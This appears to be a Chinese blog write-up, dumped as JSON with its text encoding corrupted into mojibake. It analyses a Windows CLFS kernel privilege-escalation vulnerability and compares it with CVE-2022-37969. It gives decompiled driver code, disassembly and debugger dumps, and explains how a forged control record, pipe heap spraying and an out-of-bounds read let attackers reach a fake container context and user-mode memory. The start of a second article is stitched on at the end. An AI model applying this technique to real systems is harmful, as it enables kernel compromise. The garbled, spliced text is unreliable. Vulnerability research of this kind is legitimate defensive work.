æ—¥å¿—å®¹å™¨\nåœ¨CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9aå‡½æ•°ä¸­å¯¹åº”ä½ç½®ä¼ªä»£ç åŠæ±‡ç¼–å¦‚ä¸‹ï¼š\nä»this+0x30å¤„å–æŒ‡é’ˆå¹¶è§£å¼•ç”¨ï¼Œè€Œåè®¿é—®æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åç§»24*a2çš„ä½ç½®ï¼Œå°†è¯¥å¤„ä½œä¸ºæŒ‡é’ˆèµ‹ç»™v8ï¼Œv8å†…å­˜ä½ç½®åç§»0x28åä½œä¸ºæŒ‡é’ˆå¹¶è§£å¼•ç”¨èµ‹ç»™v10ï¼Œv10å’Œv8ç›¸åŠ å¹¶è§£å¼•ç”¨åè‡ªå¢1\n__int64 __fastcall CClfsBaseFilePersisted::WriteMetadataBlock(CClfsBaseFilePersisted *this, unsigned int a2, char a3) { __int64 v4; // rsi unsigned int v6; // ebx char v7; // r12 __int64 v8; // r14 int v9; // r15d __int64 v10; // rax __int64 v11; // r9 __int64 v12; // rdx unsigned int i; // esi char *v14; // rdx struct _CLFS_CONTAINER_CONTEXT *v15; // rcx _QWORD *v16; // rsi unsigned int v18; // [rsp+34h] [rbp-54h] int v19; // [rsp+34h] [rbp-54h] unsigned int v20; // [rsp+3Ch] [rbp-4Ch] BYREF struct _CLFS_CONTAINER_CONTEXT *v21; // [rsp+40h] [rbp-48h] BYREF __int64 v22; // [rsp+48h] [rbp-40h] BYREF __int64 v23; // [rsp+50h] [rbp-38h] BOOLEAN v24; // [rsp+A8h] [rbp+20h] v4 = a2; v6 = 0; v23 = 0i64; v21 = 0i64; v7 = 0; v24 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// è·å–åç§» (this+0x30h) v23 = v8; if ( v8 ) { v7 = 1; v10 = *(unsigned int *)(v8 + 40); **v11 = ++*(_QWORD *)(v10 + v8) \u0026amp; 1i64;** v12 = *((_QWORD *)this + 6); PAGE:00000001C0034202 48 8B F9 mov rdi, rcx PAGE:00000001C0034205 33 DB xor ebx, ebx PAGE:00000001C0034207 ; 24: v23 = 0i64; PAGE:00000001C0034207 48 89 5C 24 50 mov [rsp+88h+var_38], rbx PAGE:00000001C003420C ; 25: v21 = 0i64; PAGE:00000001C003420C 48 89 5C 24 40 mov [rsp+88h+var_48], rbx PAGE:00000001C0034211 ; 26: v7 = 0; PAGE:00000001C0034211 45 32 E4 xor r12b, r12b PAGE:00000001C0034214 ; 27: v24 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); PAGE:00000001C0034214 44 88 64 24 30 mov [rsp+88h+var_58], r12b PAGE:00000001C0034219 B2 01 mov dl, 1 ; Wait PAGE:00000001C003421B 48 8B 49 20 mov rcx, [rcx+20h] ; Resource PAGE:00000001C003421F 48 FF 15 8A 0E FF FF call cs:__imp_ExAcquireResourceExclusiveLite PAGE:00000001C003421F PAGE:00000001C0034226 0F 1F 44 00 00 nop dword ptr [rax+rax+00h] PAGE:00000001C003422B 88 84 24 A8 00 00 00 mov [rsp+88h+arg_18], al PAGE:00000001C003422B PAGE:00000001C0034232 PAGE:00000001C0034232 loc_1C0034232: ; DATA XREF: .rdata:00000001C0017DD0â†‘o PAGE:00000001C0034232 ; __try { // __finally(_CClfsBaseFilePersisted__WriteMetadataBlock____1___fin$0) PAGE:00000001C0034232 44 8B EE mov r13d, esi PAGE:00000001C0034235 48 8D 0C 75 00 00 00 00 lea rcx, ds:0[rsi*2] PAGE:00000001C003423D 48 03 CE add rcx, rsi PAGE:00000001C0034240 4C 8D 04 CD 00 00 00 00 lea r8, ds:0[rcx*8] PAGE:00000001C0034248 ; 28: v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// è·å–åç§» (this+0x30h) PAGE:00000001C0034248 48 8B 4F 30 mov rcx, [rdi+30h] PAGE:00000001C003424C 4D 8B 34 08 mov r14, [r8+rcx] PAGE:00000001C0034250 ; 29: v23 = v8; PAGE:00000001C0034250 4C 89 74 24 50 mov [rsp+88h+var_38], r14 PAGE:00000001C0034255 ; 30: if ( v8 ) PAGE:00000001C0034255 4D 85 F6 test r14, r14 PAGE:00000001C0034258 75 10 jnz short loc_1C003426A PAGE:00000001C0034258 PAGE:00000001C003425A ; 74: v9 = -1072037875; PAGE:00000001C003425A 41 BF 0D 00 1A C0 mov r15d, 0C01A000Dh PAGE:00000001C0034260 ; 75: v18 = -1072037875; PAGE:00000001C0034260 44 89 7C 24 34 mov [rsp+88h+var_54], r15d PAGE:00000001C0034265 E9 28 01 00 00 jmp loc_1C0034392 PAGE:00000001C0034265 PAGE:00000001C003426A ; --------------------------------------------------------------------------- PAGE:00000001C003426A ; 32: v7 = 1; PAGE:00000001C003426A PAGE:00000001C003426A loc_1C003426A: ; CODE XREF: CClfsBaseFilePersisted::WriteMetadataBlock(ulong,uchar)+78â†‘j PAGE:00000001C003426A 41 B4 01 mov r12b, 1 PAGE:00000001C003426D ; 33: v10 = *(unsigned int *)(v8 + 40); PAGE:00000001C003426D 44 88 64 24 30 mov [rsp+88h+var_58], r12b PAGE:00000001C0034272 41 8B 46 28 mov eax, [r14+28h] PAGE:00000001C0034276 ; 34: v11 = ++*(_QWORD *)(v10 + v8) \u0026amp; 1i64; PAGE:00000001C0034276 4A FF 04 30 **inc qword ptr [rax+r14]** åœ¨zscalerå¯¹CVE-2022-37969çš„åˆ†æä¸­æåˆ°è¿‡CClfsBaseFilePersistedç±»ç»“æ„ï¼ŒCClfsBaseFilePersistedç±»çš„this+0x30å¤„å­˜å‚¨äº†ä¸€ä¸ªæŒ‡å‘å †ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¯¥ç¼“å†²åŒºå¤§å°ä¸º0xa0ï¼Œåœ¨ç¼“å†²åŒº0x30åç§»å¤„å­˜å‚¨äº†æŒ‡å‘base blockçš„æŒ‡é’ˆï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n0: kd\u0026gt; dps rdi ffffa289`156cc000 fffff800`53114020 CLFS!CClfsBaseFilePersisted::`vftable\u0026#39; ffffa289`156cc008 ffffffff`00000001 ffffa289`156cc010 00000000`00000000 ffffa289`156cc018 00000018`00000000 ffffa289`156cc020 ffffa289`1469a310 ffffa289`156cc028 00000000`19630006 ffffa289`156cc030 **ffffa289`19254810 // å †æŒ‡é’ˆ** ffffa289`156cc038 ffffa289`17bfd4d0 ffffa289`156cc040 ffffe381`a8743088 ffffa289`156cc048 00000000`0000000b ffffa289`156cc050 ffffa289`156cc000 ffffa289`156cc058 ffffe381`a87430e0 ffffa289`156cc060 00000000`0000000b ffffa289`156cc068 ffffa289`156cc000 ffffa289`156cc070 ffffe381`a8743138 ffffa289`156cc078 00000000`0000000b 0: kd\u0026gt; dq ffffa289`19254810 ffffa289`19254810 ffffe381`a5c7f680 00000000`00000400 ffffa289`19254820 00000000`00000000 ffffe381`a5c7f680 ffffa289`19254830 00000400`00000400 00000000`00000001 ffffa289`19254840 **ffffe381`a8743000** 00000800`00007a00 **// æŒ‡å‘äº†base block** ffffa289`19254850 00000000`00000002 ffffe381`a8743000 ffffa289`19254860 00008200`00007a00 00000000`00000003 ffffa289`19254870 ffffe381`a5353cc0 0000fc00`00000200 ffffa289`19254880 00000000`00000004 ffffe381`a5353cc0 0: kd\u0026gt; db ffffe381`a8743000 **// base blockå†…å®¹** ffffe381`a8743000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=......... ffffe381`a8743010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................ ffffe381`a8743020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p....... ffffe381`a8743030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffe381`a8743060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y...... ffffe381`a8743070 01 00 00 00 00 00 00 00-9c 06 ce e1 00 1c ee 11 ................ 0: kd\u0026gt; !pool ffffe381`a8743000 Pool page ffffe381a8743000 region is Paged pool *ffffe381a8743000 : large page allocation, tag is Clfs, size is 0x7a00 bytes Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys å›åˆ°è°ƒè¯•å™¨ä¸­r14å’Œraxå¯„å­˜å™¨å€¼åˆ†åˆ«é—®ffffe381a2303030å’Œ0000000000000369\n0: kd\u0026gt; rr14 r14=ffffe381a2303030 0: kd\u0026gt; rrax rax=0000000000000369 å¯ä»¥çœ‹å‡ºffffe381a2303030ä½äºä¸»blfæ–‡ä»¶çš„base block + 0x30ä½ç½®ï¼Œraxå€¼å–è‡ªäºbase block + 0x30 + 0x28\n0: kd\u0026gt; db ffffe381a2303030 + 0x28 ffffe381`a2303058 69 03 00 00 00 00 00 00-00 00 00 00 00 00 00 00 i............... æ‰€ä»¥ä»£ç ä¼šè®©ä¸»blfçš„base block + 0x30 + 0x369 = base block +0x399å¤„çš„ä¸€ä¸ªå­—èŠ‚è‡ªå¢1ï¼Œè€Œè¯¥å¤„å’ŒBaseLogRecordçš„rgContainersçš„é«˜å­—èŠ‚é‡å ï¼Œå‰é¢è¯´è¿‡æ­£å¸¸blfæ–‡ä»¶çš„rgContainerså€¼ä¸º0x1470ï¼Œåœ¨è¯¥å¤„è‡ªå¢1åï¼Œé«˜å­—èŠ‚0x14è‡ªå¢å°±å˜ä¸ºäº†0x15ï¼Œå¯¼è‡´è¯¥å¤„å€¼å˜ä¸º0x1570ï¼Œä»è€Œå¯¼è‡´åç»­å®šä½ä¸»blfæ–‡ä»¶çš„container contextæ—¶å®šä½åˆ°äº†æ”»å‡»è€…ä¼ªé€ çš„container contextã€‚\nè¿™é‡Œçš„é—®é¢˜æ˜¯ï¼Œè¯¥å¤„åŸä¸ºç»™10ä¸ªå‰¯blfæ–‡ä»¶æ·»åŠ æ—¥å¿—å®¹å™¨ï¼Œæ‰€ä»¥æŒ‰æ­£å¸¸æ¥è®²è¯¥å¤„å®šä½åˆ°çš„åº”è¯¥æ˜¯å‰¯blfæ–‡ä»¶çš„base blockï¼Œè€Œä¸æ˜¯ä¸»blfæ–‡ä»¶çš„base blockã€‚å›åˆ°CClfsBaseFilePersisted::WriteMetadataBlockå‡½æ•°ä¸­ï¼Œå®šä½base blockä»£ç å¦‚ä¸‹\nv8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// è·å–åç§» (this+0x30h) å…¶ä¸­*((_QWORD *)this + 6)ä¸ºå›ºå®šå€¼(å †æŒ‡é’ˆ)ï¼Œv4ä¸ºä¼ å…¥WriteMetadataBlockçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå›æº¯åˆ°è°ƒç”¨è€…ï¼Œå»é™¤æ— å…³é€»è¾‘ä¹‹åå¦‚ä¸‹ï¼š\n__int64 __fastcall CClfsBaseFilePersisted::ExtendMetadataBlock(__int64 a1, int a2, int a3) { ..... v3 = a2; v36 = 0i64; v42 = 0i64; v34 = 0i64; ...... EventObject = CClfsBaseFile::GetControlRecord((CClfsBaseFile *)a1, \u0026amp;v34); ...... EventObject = CClfsBaseFilePersisted::FlushControlRecord((CClfsBaseFilePersisted *)a1); for ( k = EventObject; EventObject \u0026gt;= 0; k = EventObject ) { LABEL_41: if ( *v12 != 2 ) break; ...... v27 = *((unsigned __int16 *)v34 + 0xD); v28 = *((unsigned __int16 *)v34 + 0xD); if ( ((_WORD)v27 == *((_WORD *)v34 + 12) || CClfsBaseFilePersisted::IsShadowBlock(v14, v27, *((unsigned __int16 *)v34 + 12))) \u0026amp;\u0026amp; *(_DWORD *)(*(_QWORD *)(a1 + 48) + 24 * v27 + 8) \u0026gt;\u0026gt; 9 \u0026lt; *((_DWORD *)v34 + 7) ) { CClfsBaseFilePersisted::ExtendMetadataBlockDescriptor( (CClfsBaseFilePersisted *)a1, v28, *((_DWORD *)v34 + 9) \u0026gt;\u0026gt; 1); LOWORD(v27) = *v25; } CClfsBaseFilePersisted::WriteMetadataBlock((CClfsBaseFilePersisted *)a1, (unsigned __int16)v27, 0); ...... } } } } } } } } } ...... return (unsigned int)EventObject; } WriteMetadataBlockçš„ç¬¬äºŒä¸ªå‚æ•°æ¥æºäºCClfsBaseFile::GetControlRecordçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œè·Ÿè¿›CClfsBaseFile::GetControlRecordé€»è¾‘\n__int64 __fastcall CClfsBaseFile::GetControlRecord(CClfsBaseFile *this, struct _CLFS_CONTROL_RECORD **a2) { ...... *a2 = 0i64; v13 = 0; v14 = 0; result = CClfsBaseFile::AcquireMetadataBlock(this); v5 = result; if ( (int)result \u0026gt;= 0 ) { v6 = (_DWORD *)*((_QWORD *)this + 6); // è®¿é—®this+0x30å¤„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†0x90å¤§å°çš„heap v7 = *(_QWORD *)v6; // è¯¥æ®µå†…å­˜å­˜å‚¨äº†ä¸€äº›å†…å­˜æŒ‡é’ˆï¼Œè·å–åç§»0x0å¤„çš„æŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†control block v8 = v6[2]; v9 = *(unsigned int *)(*(_QWORD *)v6 + 0x28i64);// è·å–control block 0x28çš„æ•°å€¼ v10 = *(_QWORD *)v6 + v9; // å°†control block 0x28å¤„æ•°å€¼å’Œcontrol blockç›¸åŠ ï¼Œè®¡ç®—control record if ( (unsigned int)v9 \u0026lt; v8 \u0026amp;\u0026amp; (unsigned int)v9 \u0026gt;= 0x70 \u0026amp;\u0026amp; v8 - (unsigned int)v9 \u0026gt;= 0x68 ) { v11 = 24i64 * *(unsigned __int16 *)(v10 + 72); if ( v8 - (unsigned int)v9 - 80 \u0026gt;= v11 ) { if ( (g_signatureOffsetsValidation \u0026amp; 1) == 0 || (v12 = *(unsigned int *)(v7 + 104), v11 + (unsigned int)(v9 + 80) \u0026lt;= v12) \u0026amp;\u0026amp; (unsigned int)v12 \u0026lt;= v8 \u0026amp;\u0026amp; (int)RtlULongMult(*(unsigned __int16 *)(v7 + 4), 2u, \u0026amp;v13) \u0026gt;= 0 \u0026amp;\u0026amp; (int)RtlULongAdd(v12, v13, \u0026amp;v14) \u0026gt;= 0 \u0026amp;\u0026amp; v14 \u0026lt;= v8 ) { *a2 = (struct _CLFS_CONTROL_RECORD *)v10; return v5; } if ( WPP_GLOBAL_Control != \u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_DWORD *)WPP_GLOBAL_Control + 11) \u0026amp; 0x8000000) != 0 ) WPP_SF_sdLLH(*((_QWORD *)WPP_GLOBAL_Control + 3)); } } return 0xC01A000Di64; } return result; } åˆ†æè¯¥ä»£ç ï¼Œè™½ç„¶thiså‚æ•°ä¸ºCClfsBaseFile *ç±»å‹ï¼Œä½†åœ¨è°ƒç”¨CClfsBaseFile::GetControlRecordçš„CClfsBaseFilePersisted::ExtendMetadataBlockå‡½æ•°ä¸­ä¼ å…¥çš„è¯¥å‚æ•°åŸç±»å‹ä¸ºCClfsBaseFilePersistedã€‚\nè¯¥ä»£ç æœ€ç»ˆè®¡ç®—a2çš„é€»è¾‘ä¸ºä»this+30å¤„å–å¾—æŒ‡é’ˆå¹¶è§£å¼•ç”¨ï¼Œè·å¾—control blockåœ°å€ï¼Œè€Œåè§£å¼•ç”¨è¯¥åœ°å€å¹¶åœ¨åç§»0x28å¤„å–å¾—ä¸€ä¸ªåç§»ï¼Œå°†è¿™ä¸ªåç§»å’Œcontrol blockç›¸åŠ è·å¾—control recordåœ°å€å¹¶èµ‹ç»™a2.\nåœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°è¯¥åç§»ä¸º0x70ï¼Œå³ä»control block +0x70ä½ç½®å®šä½åˆ°äº†control record\n0: kd\u0026gt; db ffffe381`a5c7f680 + 0x28 ffffe381`a5c7f6a8 70 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p............... å›åˆ°CClfsBaseFilePersisted::ExtendMetadataBlockå‡½æ•°ä¸­ï¼Œåœ¨å–å¾—control recordä¹‹åï¼Œåœ¨control record+0x1aå¤„å–å¾—å€¼å¹¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥CClfsBaseFilePersisted::WriteMetadataBlockä¸­ï¼Œè¯¥å¤„å–å¾—å€¼ä¸º0x13\n0: kd\u0026gt; db ffffe381`a5c7f680 + 0x70 + 0x1a ffffe381`a5c7f70a 13 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ æ ¹æ®å‰é¢CClfsBaseFilePersisted::WriteMetadataBlockçš„é€»è¾‘å¯çŸ¥ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥0x13ä¹‹åè®¡ç®—çš„åç§»ä¸º0x18*0x13=0x1c8ï¼Œå³ä»poi(CClfsBaseFilePersisted+0x30)+0x1c8å–å¾—å€¼å¹¶è·å–poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28å¤„çš„åç§»ã€‚\nåœ¨å‰é¢åˆ†æCClfsBaseFilePersistedç»“æ„çŸ¥é“ï¼Œ0x30åç§»å¤„æŒ‡å‘çš„å †å†…å­˜å¤§å°åªæœ‰0xa0\n0: kd\u0026gt; !pool ffffa289`19254810 Pool page ffffa28919254810 region is Nonpaged pool ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254760 size: a0 previous size: 0 (Free) Vad *ffffa28919254800 size: a0 previous size: 0 (Allocated) *Clfs Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254940 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 å½“ä½¿ç”¨0x1c8è®¿é—®æ—¶ä¼šäº§ç”Ÿè¶Šç•Œï¼Œæ­¤æ—¶è¯»å–åˆ°çš„å®é™…æ˜¯ä½¿ç”¨pipe WriteFileæ—¶ç”³è¯·çš„å †ï¼Œæ­¤å‰é€šè¿‡pipeå†™å…¥äº†ä¸»blfæ–‡ä»¶çš„base block+0x30ï¼Œæ‰€ä»¥è¯¥å¤„è¯»å–åˆ°çš„åœ°å€å®é™…ä¸Šæ˜¯ä¸»blfæ–‡ä»¶çš„base block + 0x30ã€‚\nç»è¿‡poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28è¿ç®—ä¼šå–åˆ°ä¸»blfæ–‡ä»¶çš„base block + 0x58çš„ä½ç½®ï¼Œè€Œè¯¥ä½ç½®å€¼å·²ç»è¢«ä¿®æ”¹ä¸ºäº†0x369.\n0: kd\u0026gt; dq ffffa289`19254810 + 0x1c8 ffffa289`192549d8 ffffe381`a2303030 7246704e`0a0a0000 ffffa289`192549e8 5e85fe62`4567d0ee ffffe381`a9cb4258 ffffa289`192549f8 ffffe381`a9cb4258 00000000`00000000 ffffa289`19254a08 ffffe381`a90c79c0 00000060`00000000 ffffa289`19254a18 00000000`00000060 ffffe381`a2303030 ffffa289`19254a28 ffffe381`a2303030 ffffe381`a2303030 ffffa289`19254a38 ffffe381`a2303030 ffffe381`a2303030 ffffa289`19254a48 ffffe381`a2303030 ffffe381`a2303030 0: kd\u0026gt; !pool ffffa289`19254810+0x1c8 Pool page ffffa289192549d8 region is Nonpaged pool ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs ffffa28919254760 size: a0 previous size: 0 (Free) Vad ffffa28919254800 size: a0 previous size: 0 (Allocated) Clfs ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs *ffffa28919254940 size: a0 previous size: 0 (Allocated) *NpFr Process: ffffa28915324300 Pooltag NpFr : DATA_ENTRY records (read/write buffers), Binary : npfs.sys ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300 ä¹‹åé€šè¿‡è¿ç®—poi(0x369+ base block + 0x30)++å®é™…ä¸Šè®©ä¸»blfæ–‡ä»¶çš„base block+0x399è‡ªå¢1ã€‚æœ€ç»ˆåœ¨å¯¹ä¸»blfæ–‡ä»¶è°ƒç”¨CreateLogFileæ˜¯å®šä½åˆ°çš„container contextåç§»ä¸º0x1570ï¼Œæ‰¾åˆ°äº†æ”»å‡»è€…ä¼ªé€ çš„æ¶æ„contener contextï¼Œåœ¨é€šè¿‡pContainerå¯¹è±¡æ‰§è¡Œåˆ°äº†ç”¨æˆ·å±‚å†…å­˜0x5000000ä¹‹ä¸­ã€‚\nè¡¥ä¸åˆ†æ\nWin10 21H2\ndiffè¡¥ä¸ï¼Œå¯å‘ç°è¡¥ä¸ä¸»è¦ä¿®æ”¹äº†CClfsBaseFile::GetControlRecordã€CClfsBaseFile::AcquireMetadataBlockï¼ŒåŒæ—¶æ–°å¢äº†ä¸€ä¸ªå‡½æ•°CClfsLogFcbPhysical::ValidateScratchBlockOffsetsï¼Œåœ¨CClfsLogFcbPhysical::SetEndOfLogå’ŒCClfsLogFcbPhysical::RecoverTruncateLogä¸­å¼•ç”¨ã€‚\nWin11 21H2\nå°ç»“\nåœ¨CVE-2022-37969ä¸­æ˜¯é€šè¿‡å‰ä¸€ä¸ªblfæ–‡ä»¶çš„é”™è¯¯çš„cbSymbolZoneä¿®æ”¹äº†ä¸‹ä¸€ä¸ªblfæ–‡ä»¶çš„conteiner contextçš„pContaienrå¯¹è±¡æŒ‡é’ˆï¼Œä»è€Œåœ¨åç»­å®šä½CClfsContainerå¯¹è±¡æ—¶è®¿é—®åˆ°äº†ç”¨æˆ·å±‚å†…å­˜ï¼Œè¾¾æˆæ”»å‡»æµç¨‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨éœ€è¦é€šè¿‡å¾ªç¯åˆ›å»ºblfæ–‡ä»¶æ¥è¾¾åˆ°ç¨³å®šçš„å †å†…å­˜ç»“æ„ï¼Œä»è€Œä½¿å¾—åç»­å¯ä»¥æˆåŠŸä¿®æ”¹åé¢çš„blfæ–‡ä»¶çš„conteiner contextã€‚\nåœ¨CVE-2022-37969è¡¥ä¸ä¸­å¢åŠ äº†å¯¹client contextã€cbSymbolZoneè¶Šç•Œæ£€æµ‹ï¼Œä»è€Œä¸èƒ½ç›´æ¥é€šè¿‡è¿™ç§æ–¹æ³•æŸåconteiner contextå¯¹è±¡æŒ‡é’ˆã€‚\nåœ¨æœ¬æ¬¡æ¼æ´åˆ©ç”¨ä¸­ï¼Œå·§å¦™åœ°é€šè¿‡ä¼ªé€ control recordçš„æ•°æ®æ¥é€ æˆè¶Šç•Œè¯»å–ï¼Œä»è€Œä¿®æ”¹å¦å¤–çš„base blockæ•°æ®ï¼Œè¯¥å¤„ä¿®æ”¹æ˜¯é€šè¿‡æŒ‡é’ˆå®šä½åˆ°æŒ‡å®šçš„å†…å­˜ï¼Œæ‰€ä»¥ä¸ç”¨åƒCVE-2022-37969ä¸­é€šè¿‡åå¤åˆ›å»ºblfæ–‡ä»¶æ¥è¾¾æˆä¸€ç§ç¨³å®šçš„å†…å­˜é—´éš™çŠ¶æ€ï¼Œä½†åˆ©ç”¨è¿‡ç¨‹ä¸­ä»ç„¶éœ€è¦é€šè¿‡å¸ƒå±€å†…å­˜ä½¿å¾—åœ¨è¶Šç•Œè¯»å–æ—¶è¯»å–åˆ°çš„æ˜¯æŒ‡å®šçš„å†…å­˜åœ°å€ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.secrss.com/articles/54881\nhttps://www.anquanke.com/post/id/288808\nhttps://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/\nCreated at 2023-05-31T19:44:15+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/","title":"CVE-2022-37969","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ blfæ—¥å¿—æ–‡ä»¶ç»“æ„\nåŸºæœ¬æ—¥å¿—å—å­˜å‚¨äº†åŸºæœ¬æ—¥å¿—æ–‡ä»¶å…³è”çš„å®¢æˆ·ç«¯å’Œå®¹å™¨ä¸Šä¸‹æ–‡ä¿¡æ¯\nåŸºæœ¬æ—¥å¿—å—ç”±6ä¸ªmetaæ•°æ®å—ç»„æˆï¼Œåˆ†åˆ«æ˜¯æ§åˆ¶å—ã€åŸºæœ¬å—ã€æˆªæ–­å—ä»¥åŠå¯¹åº”çš„shadowå—ï¼Œæ¯ä¸ªå—ç”±æ—¥å¿—å—å¤´å¼€å§‹ï¼Œå¤§å°ä¸º0x70 bytes\næ—¥å¿—å—å¤´å®šä¹‰ï¼š\ntypedef struct _CLFS_LOG_BLOCK_HEADER { UCHAR MajorVersion; UCHAR MinorVersion; UCHAR Usn; CLFS_CLIENT_ID ClientId; USHORT TotalSectorCount; USHORT ValidSectorCount; ULONG Padding; ULONG Checksum; ULONG Flags; CLFS_LSN CurrentLsn; CLFS_LSN NextLsn; ULONG RecordOffsets[16]; ULONG SignaturesOffset; } CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER; å†…å­˜å¸ƒå±€\nSignatureOffsetæ˜¯äº†åœ¨å†…å­˜ä¸­å­˜å‚¨æ¯ä¸ªæ‰‡åŒºç­¾åçš„æ•°ç»„çš„åç§»ã€‚æ‰‡åŒºç­¾åä½äºæ¯ä¸ªæ‰‡åŒºçš„æœ«å°¾ï¼Œå¤§å°ä¸¤ä¸ªå­—èŠ‚ï¼Œç”±æ‰‡åŒºå—ç±»å‹ï¼ˆ1 å­—èŠ‚ï¼‰å’Œ USNï¼ˆ1 å­—èŠ‚ï¼‰ç»„æˆã€‚æ¯ä¸ªæ‰‡åŒºå¤§å°ä¸º0x200ã€‚\nåœ¨BLFæ–‡ä»¶ä¸­ï¼ŒåŸºæœ¬å—ä»åç§»0x800å¼€å§‹ï¼Œåˆ°0x81FFï¼Œä»¥æ—¥å¿—å—å¤´å¼€å§‹ï¼Œç„¶åæ˜¯åŸºæœ¬è®°å½•å¤´\nåŸºæœ¬è®°å½•å¤´å®šä¹‰å¦‚ä¸‹,å¤§å°ä¸º1338ï¼Œåˆ°åç§»1BA8å¤„\ntypedef struct _CLFS_METADATA_RECORD_HEADER { ULONGLONG ullDumpCount; } 